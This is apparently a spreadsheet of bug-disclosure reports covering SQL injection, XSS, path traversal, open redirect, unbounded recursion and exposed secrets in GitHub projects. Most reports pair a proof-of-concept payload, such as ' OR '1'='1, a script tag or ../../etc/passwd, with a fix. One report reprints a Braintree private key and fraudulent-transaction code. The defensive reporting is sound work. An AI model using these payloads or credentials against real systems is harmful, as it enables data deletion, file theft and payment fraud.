Case,ID,Repository,CWE,Severity,Submitted At,Approved At,Description
1,1745334014083,https://github.com/Uthpal-p/Library-Management-system-using-Python,"CWE-674, CWE-121",Medium,2025-04-25T12:49:42.000Z,2025-04-27T01:23:36.000Z,"Explanation:
The recursive input validation functions validd() and valid() in the code call themselves repeatedly whenever the user inputs an invalid book code. This unchecked recursion can cause the call stack to grow indefinitely if the user keeps entering invalid input, eventually exhausting the stack memory and causing a stack overflow error or a RecursionError in Python.

Severity: 3 (Medium)

POC (Proof of Concept):
Consider this simplified recursive input function at line 43 in main_lms.py:

def validd():
    code = input('Enter book code: ')
    if code != 'valid_code':
        print('Invalid code, try again.')
        validd()  # Recursive call without limit

validd()

If the user never enters 'valid_code', the recursion never stops, causing a stack overflow after enough recursive calls.

Root Cause:
Each recursive call adds a new frame to the call stack. Since validd() calls itself without a terminating condition based on recursion depth or retry limits, continuous invalid inputs cause the stack to grow until it exceeds Python’s maximum recursion depth, triggering a RecursionError or stack overflow

Exploit Scenario:
An attacker or careless user can intentionally input invalid book codes repeatedly, causing the program to crash due to stack overflow. This denial-of-service (DoS) scenario disrupts the library system’s availability.

Why it Happens:
Python’s recursion mechanism pushes each function call onto the call stack. Unlike loops, which reuse the same stack frame, recursion accumulates frames. Without a base case that stops recursion or a limit on retries, the stack grows until the interpreter’s recursion limit is hit

Security Implications:
1.Denial of Service: Repeated invalid inputs crash the program, making the service unavailable.
2.Resource Exhaustion: Stack overflow consumes memory and CPU resources unnecessarily.
3.Potential Crash: In some Python implementations or environments, unhandled stack overflows may lead to abrupt crashes.

Suggested Fix:
Replace recursive input validation with an iterative loop that limits the number of retries, for example:

def validd():
    attempts = 0
    max_attempts = 5
    while attempts < max_attempts:
        code = input('ENTER THE BOOK CODE OF THE BOOK TO BE BORROWED: ')
        if code in list(fp.loc[:, 'BOOK CODE']):
            return code
        else:
            print('Please enter valid book code.')
            attempts += 1
    print('Too many invalid attempts. Exiting input.')
    return None

This approach prevents unbounded recursion and stack overflow by using iteration and limiting retries"
2,1745335148884,https://github.com/saleor/saleor/blob/main/saleor/payment/gateways/stripe/tests/test_plugin.py,CWE-547,Low,2025-04-27T11:32:48.000Z,2025-04-29T00:53:49.000Z,"Root Cause: The code contains hardcoded sensitive values like API keys (e.g., ""secret_key"") directly in the source. This occurs when developers embed authentication tokens/secrets as string literals rather than using secure configuration management.

Exploit Scenario: An attacker with access to the source code (via leaks/repo access) extracts hardcoded Stripe API keys. They could create fraudulent charges, access payment data, or manipulate Stripe account operations.

Why It Happens: Developers hardcode secrets for testing convenience or oversight, failing to implement secure credential storage practices during implementation, leaving production credentials exposed.

Security Implications: Compromised payment gateway control, unauthorized transactions, PCI-DSS violations, and loss of customer trust due to exposure of payment processing credentials.

Suggested Fix: Replace hardcoded values with environment variables/secure vaults. For Stripe keys, use os.getenv(""STRIPE_SECRET_KEY"") and ensure secrets are never committed to version control."
3,1745336228778,kunzbhatia/Library-Management-System/blob/main/User.py,CWE-89,High,2025-04-27T17:10:25.000Z,2025-04-28T00:50:15.000Z,"Explanation:
Vulnerable functions such as deleteUser() and searchUser() are located in Line 42 and Line 53, which belong to
https://github.com/kunzbhatia/Library-Management-System/blob/main/User.py
Use string formatting (format()) to construct SQL queries directly with user input, which makes them vulnerable to SQL injection attacks. If UserID contains malicious SQL code, it can alter the query logic.


POC:
For the deleteUser() function, if a malicious user enters the following as UserID: ' OR '1'='1
The constructed query becomes: DELETE from UserRecord where UserID = '' OR '1'='1'

This will delete all users from the UserRecord table.


Root Cause:
Line 46: deleteUser(): mycursor.execute(""DELETE from UserRecord where UserID = {0} "".format(""\'""+UserID+""\'"")) 


Why it Happens:
User input is directly concatenated into SQL queries without sanitization or parameterization, making the queries vulnerable to SQL injection.


Security Implications:
Attacker can inject malformed SQL queries to extract the sensitive information from the database and since the application does not hash the passwords before storing them as evident from the logic, it can lead to complete compromise of the user accounts.

Suggested Fix:
Use parameterized queries to prevent SQL injection.

Fixed deleteUser() snippet:
mycursor.execute(""DELETE from UserRecord where UserID = %s"", (UserID,))"
4,1745337278378,https://github.com/rio-labs/rio/blob/main/frontend/code/components/scrollTarget.ts,CWE-79,High,2025-04-27T07:50:32.000Z,2025-04-27T08:02:17.000Z,"Root Cause: The vulnerability arises because the id value from the component state is directly injected into window.location.href without sanitization. This unsanitized input is used to construct a URL hash that could contain malicious scripts.

Exploit Scenario: An attacker could craft a malicious id value (e.g., #<script>alert('XSS')</script>) and trick a user into copying the generated URL. When the victim visits the URL, the script executes in their browser, leading to session hijacking or data theft.

Why It Happens: The code trusts user-controlled id values (passed via deltaState.id) and directly appends them to the URL hash. No validation or encoding is applied to prevent HTML/JavaScript injection in the client-side DOM.

Security Implications: Attackers can execute arbitrary JavaScript in the victim’s browser, enabling actions like stealing cookies, redirecting to phishing sites, or performing unauthorized actions on behalf of the user.

Suggested Fix: Sanitize the id parameter using a library like DOMPurify or encode it with encodeURIComponent() before appending to the URL. Ensure only alphanumeric/safe characters are allowed in the id field via input validation."
5,1745344282769,https://github.com/heli-toon/LBSHS-LMS,CWE-89,High,2025-04-22T17:51:22.000Z,2025-04-24T14:53:54.000Z,"Summary:
The SQL injection vulnerability in the `search_page_item.lookup()` method allows attackers to inject malicious SQL code into the search query. This could potentially lead to unauthorized data access or manipulation, posing a significant security risk if left unaddressed.

---

Description:
The search functionality in the Laravel application is vulnerable to SQL injection in the `lookup()` method. The query constructed dynamically by directly inserting user input into the SQL statement is insecure and allows attackers to manipulate the query. For example:

```python
cursor.execute(f""SELECT * FROM books WHERE {self.column} LIKE '%{self.searched}%'"")
```

If an attacker inputs a malicious payload such as `' OR 1=1 --`, it would manipulate the SQL query to always return true, thereby bypassing authentication and potentially leaking all records from the database.

The absence of proper sanitization or parameterized queries makes this vulnerability exploitable. The risk is high because it exposes the application to unauthorized data access, modification, or complete database compromise.

---

Impact:
The potential impact of this vulnerability includes:

1. Unauthorized Data Access:
   - Attackers can extract sensitive data by manipulating the SQL query.
   
2. Data Modification or Deletion:
   - Attackers may alter or delete records in the database if additional privileges or misconfigurations are present.
   
3. Privilege Escalation:
   - In certain configurations, attackers may escalate their privileges and perform administrative tasks within the application.

---

**Proof of Concept (PoC):**
The vulnerability can be tested by inputting the following string in the search field:

```sql
' OR 1=1 --
```

This input will modify the SQL query to:

```sql
SELECT * FROM books WHERE book_name LIKE '%' OR 1=1 --%'
```

This results in the query always returning `TRUE`, bypassing any filters and potentially returning all records from the `books` table.

---

Steps to Reproduce:

1. Navigate to the search page in the Laravel application.
2. In the search field, enter the following payload:

   ```sql
   ' OR 1=1 --
   ```

3. The application will return all records from the database instead of the expected search results.

4. In some cases, attackers could modify the query further to delete or modify data in the database.

---

Recommended Fix:
To fix this SQL injection vulnerability, use parameterized queries, which ensure that user input is treated as data rather than executable code. Here’s an updated version of the vulnerable query:

```python
cursor.execute(""SELECT * FROM books WHERE {} LIKE ?"".format(self.column), ('%' + self.searched + '%',))
```

This change ensures that user input is safely passed as a parameter to the query, protecting against SQL injection attacks.

Additionally, always validate and sanitize user inputs, and consider using an ORM (Object-Relational Mapping) system that automatically handles such concerns."
6,1745351755910,https://github.com/samir-k1/Firebase-Tut,CWE-200,Very Low,2025-04-24T17:21:25.000Z,2025-04-27T11:51:17.000Z,"1. What is the Firebase API Key?
It’s used to connect front-end apps (web/mobile) with Firebase services like Firestore, Realtime Database, Storage, Auth, etc.
It’s public by design and is not a secret on its own. The real vulnerability arises from misconfigured Firebase security rules.

 2. Vulnerability: Misconfigured Security Rules
By default, Firebase services are secure. But developers sometimes:
Set rules like this during testing:

{
  ""rules"": {
    "".read"": ""true"",
    "".write"": ""true""
  }
}
Or accidentally allow unauthenticated access:

{
  ""rules"": {
    "".read"": ""auth != null"",
    "".write"": ""auth != null""
  }
}
But they also allow anonymous auth, making this ineffective.

 Exploit It
Step-by-step exploitation:
Find public Firebase keys:

Tools like GitHub dorks, Google dorks, or web scanning can reveal exposed Firebase config objects.
const firebaseConfig = {
  apiKey: ""AIza..."",
  authDomain: ""myapp.firebaseapp.com"",
  databaseURL: ""https://myapp.firebaseio.com"",
  ...
};
Check security rules using tools like firebase.security or manual testing.

If .read/.write rules are too loose:

Attackers can read sensitive data (emails, tokens, etc.).

Attackers can inject or delete data.

Upload malicious files to Storage (e.g., viruses or fake downloads).

Possibly bypass app logic (fake purchases, manipulate leaderboards, etc.)
6. How to Prevent It
Use strict rules:

{
  ""rules"": {
    "".read"": ""auth != null && auth.uid == 'expectedUID'"",
    "".write"": ""auth != null && auth.uid == 'expectedUID'""
  }
}
Avoid anonymous auth unless needed

Use Firebase App Check (prevents abuse from unauthorized clients)"
7,1745384149086,Dungyichao/http_server#,CWE-22,High,2025-04-28T07:25:16.000Z,2025-04-29T00:58:30.000Z,"Path to File: ""http_server\src\api_server\main.cpp""

Vulnerability Type: CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)

OWASP Category: A05:2021 – Security Misconfiguration

Severity: High(4)

Root Cause:
The server directly uses user-supplied HTTP request paths without sanitization or canonicalization, allowing directory traversal attacks.

Exploit Scenario:
A remote attacker sends an HTTP GET request with a path like /../../etc/passwd, causing the server to open and send arbitrary files outside the intended directory.

Why It Happens:
The input (requested URL path) is used directly with file system operations without proper validation, enabling path traversal.

Security Implications:
Attackers can read sensitive server files, such as password files or SSH keys, leading to serious security breaches.

Suggested Fix:
Sanitize incoming paths, block paths containing "".."" sequences, and restrict file access to within a predefined base directory."
8,1745393576919,https://github.com/Mazbaul/Online-Learning-And-Course-Management-System,CWE-601,Medium,2025-04-23T07:32:56.000Z,2025-04-23T08:09:35.000Z,"An open redirect vulnerability was discovered in the RegisterController.php file of the Mazbaul/Online-Learning-And-Course-Management-System repository. The vulnerability occurs due to insufficient validation of the user-supplied redirect_url query parameter. After a successful registration, the app redirects users based on this input without ensuring it's an internal URL. This allows attackers to craft links that can redirect victims to external, malicious domains, potentially leading to phishing, malware delivery, or other user exploitation.
[Refer to the ZIP file for detailed Report]"
9,1745402607146,stitionai/devika,CWE-22,High,2025-04-27T12:22:15.000Z,2025-04-27T12:24:21.000Z,"Vulnerability Type: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

OWASP Top 10: A1:2021 - Broken Access Control

Severity: High (4)

Root Cause: The server uses user-supplied input directly in file paths without validating or sanitizing the input, allowing directory traversal.

Exploit Scenario: An attacker sends a GET request to /get-project-files?project-name=../../../../etc/passwd to retrieve sensitive files outside the intended directory.

Why It Happens: The application constructs file paths using unvalidated input, enabling traversal outside the target directory via '../' sequences.

Security Implications: Allows arbitrary file read, potentially exposing server secrets, credentials, or user data. May lead to full system compromise.

Suggested Fix: Use path.basename to strip directory traversal sequences and restrict access to a specific folder (e.g., 'projects')."
10,1745405590584,https://github.com/ateeshkumar/e-commerce-backend/blob/main/controllers/productController.js,CWE-798,Low,2025-04-27T14:34:22.000Z,2025-04-27T14:36:15.000Z,"Vulnerability: Exposed Braintree Private Key in Code
1. What Happened?
const gateway = new braintree.BraintreeGateway({
  environment: braintree.Environment.Sandbox,
  merchantId: 'rqvzbh7mvbk7j7z6',
  publicKey: 'd2c5c28rzs7mptn5',
  privateKey: '6381b191eda7d013124fd464222dbb1e'  // ← Critical exposure
});
The privateKey is supposed to be secret and used ONLY on the backend.
Including it in frontend/client-side code or a public repo exposes your entire payment gateway to anyone on the internet.

2. How an Attacker Can Exploit It
  1. Locate the Key
Hacker finds the API key in:

Public GitHub repo

Frontend JavaScript (viewed in DevTools)

Unprotected environment variable or .env file in a repo

 2. Authenticate as You
The attacker uses your merchantId, publicKey, and privateKey to authenticate with Braintree’s SDK (Node.js, Python, etc.).
const gateway = new braintree.BraintreeGateway({
  environment: braintree.Environment.Sandbox,
  merchantId: 'yourId',
  publicKey: 'yourKey',
  privateKey: 'yourPrivateKey'
});
3. Perform Malicious Actions
Now they have full backend privileges. They can:

Generate client tokens

 Perform card testing attacks (using stolen credit cards)

Initiate fake transactions

Cancel/refund real payments

 Create customer profiles and payment methods

 Potential Impact

How to Prevent This
1. Never expose private API keys
Keep them in .env files (not committed to Git).

Use process.env.BRAINTREE_PRIVATE_KEY in your backend app.

 2. Move all sensitive code to your backend
Only your backend should:

Connect to Braintree

Generate client tokens

Initiate or settle transactions

Frontend should only receive safe tokens or data from backend via API calls.

3. Revoke Exposed Credentials Immediately
Go to your Braintree Dashboard

Revoke the exposed privateKey

Generate a new one and update your server securely

 Example: Card Testing via Exposed Keys
A hacker runs this with your keys:

const nonce = ""fake-valid-nonce"";  // or from Braintree's test data
gateway.transaction.sale({
  amount: ""10.00"",
  paymentMethodNonce: nonce,
  options: { submitForSettlement: true }
}, (err, result) => {
  if (result.success) {
    console.log(""Fraudulent transaction completed"");
  }
});
⚠️ This means you're paying for the transaction, and may even be fined.

Summary

Exposed Item	Risk Level
merchantId	Low risk
publicKey	Low risk
privateKey	Critical 🔥
Never expose your private key. Treat it like a root password to your payment gateway."
